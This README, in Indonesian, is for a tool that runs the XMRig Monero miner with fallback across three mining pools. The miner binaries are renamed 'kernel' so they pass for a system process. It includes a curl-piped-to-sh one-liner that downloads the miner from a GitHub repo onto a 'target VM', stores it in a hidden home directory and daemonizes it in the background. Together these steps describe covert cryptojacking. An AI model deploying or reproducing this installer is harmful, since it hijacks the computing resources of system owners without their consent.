# Kernel XMRig Fallback Runner

Tools ini menjalankan XMRig dengan fitur fallback ke 3 pool:
1. `gulf.moneroocean.stream:10128` (prioritas utama)
2. `pool.supportxmr.com:3333`
3. `xmrpool.eu:3333`

## File di Repo (Root)

| File | Keterangan |
|------|-----------|
| `kernel` | Binary runner hasil compile dari `kernel.go` (Linux x86_64) |
| `kernelU` | Binary XMRig asli (Linux x86_64) |
| `kernel.go` | Source code Go |
| `oneline-kernel.sh` | Script installer/runner |

## Cara Build di Linux

```bash
cd /path/to/kernel
go build -o kernel kernel.go
```

Atau cross-compile dari Windows WSL:

```bash
GOOS=linux GOARCH=amd64 go build -o kernel kernel.go
```

## Cara Upload ke Repo GitHub (Web)

1. Buka `https://github.com/anonking-67/anon76`.
2. Klik **Add file** → **Upload files**.
3. Upload file-file ini satu per satu ke root repo:
   - `kernel`
   - `kernelU`
   - `kernel.go`
   - `oneline-kernel.sh`
4. Klik **Commit changes**.

## Cara Install & Run di Target VM

```bash
curl -fsSL https://github.com/anonking-67/anon76/raw/refs/heads/main/oneline-kernel.sh | sh
```

Script akan:
1. Download `kernel` dan `kernelU` ke `$HOME/.kernel-worker/`.
2. `chmod +x` kedua file.
3. Jalankan `./kernel` yang otomatis daemonize ke background.

## Verifikasi Berjalan

```bash
ps aux | grep kernel
pgrep -f "./kernel"
```
